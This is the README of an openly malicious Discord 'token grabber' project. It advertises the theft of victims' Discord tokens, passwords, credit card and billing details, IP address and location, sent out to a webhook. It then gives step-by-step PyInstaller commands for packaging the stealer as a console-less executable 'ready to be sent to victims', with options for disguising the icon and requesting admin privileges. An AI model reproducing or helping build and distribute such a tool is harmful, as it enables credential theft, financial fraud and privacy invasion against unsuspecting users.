<img src="https://img.shields.io/github/watchers/Rdimo/Hazard-Token-Grabber?color=%23daff00&label=Watchers" alt="shield.png"></a>
<img src="https://img.shields.io/github/stars/Rdimo/Hazard-Token-Grabber?color=%23daff00&label=Stars" alt="shield.png"></a>

#### Hazard Token Grabber was made by
Love ❌
code ✅

### Features
* `username`
* `user id`
* `Email`
* `phone`
* `nitro type`
* `billing info`
* `os`
* `pc username`
* `token location`
* `ip`
* `google maps location`
* `city`
* `region`
* `local language`
* `if they have verified email`
* `if 2fa is enabled`
* `creation date`
* `their discord token from all their accounts they have`
* `their password for discord (you get their password if they update it)`
* `all of their credit card info (if they put one in)`
* The webhook looks like [this](https://imgur.com/bgDXl1F)

### 📁・Compiling it to an executable
Install [pyinstaller](https://pypi.org/project/pyinstaller/) by doing `pip install pyinstaller`
Then go into the directory of the grabber and type
```
pyinstaller --onefile --noconsole main.py
```
replace main.py with the file name if you changed it
3 folders and 1 file will be created, you can delete them all except for the dist folder
go into the dist folder and there is your exe ready to be sent to victims!

### ⚙・ More options
Add these into the command when creating the exe if you want

|    Pyinstaller Options 		|
| ------------------------------------ 	|
| `-n name` Name that the exe will have (default is the .py file)	|
| `-i icon.ico` Icon that the exe will have (do `-i NONE` for normal executable look)	|
| `--clean` Clean PyInstaller cache and remove temporary files before building	|
| `--uac-admin` Requests admin privileges upon running the exe |
| `--hidden-import MODULENAME` Name an import not visible in the code of the script. Can be used multiple times |
